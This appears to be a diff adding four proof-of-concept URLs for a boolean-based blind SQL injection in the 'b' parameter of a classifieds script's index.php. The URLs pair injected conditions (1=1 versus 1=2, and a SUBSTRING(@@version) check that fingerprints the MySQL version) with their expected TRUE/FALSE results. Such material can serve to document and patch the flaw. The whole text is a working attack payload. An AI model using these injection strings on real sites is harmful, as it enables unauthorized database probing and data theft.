@@ -1,0 +1,4 @@
+http://www.example.com/classifiedsscript/index.php?a=5&b=341+and+1=1 <= TRUE
+http://www.example.com/classifiedsscript/index.php?a=5&b=341+and+1=2 <= FALSE
+http://www.example.com/classifiedsscript/index.php?a=5&b=341+AND SUBSTRING(@@version,1,1)=5 <= TRUE
+http://www.example.com/classifiedsscript/index.php?a=5&b=341+AND SUBSTRING(@@version,1,1)=4 <= FALSE
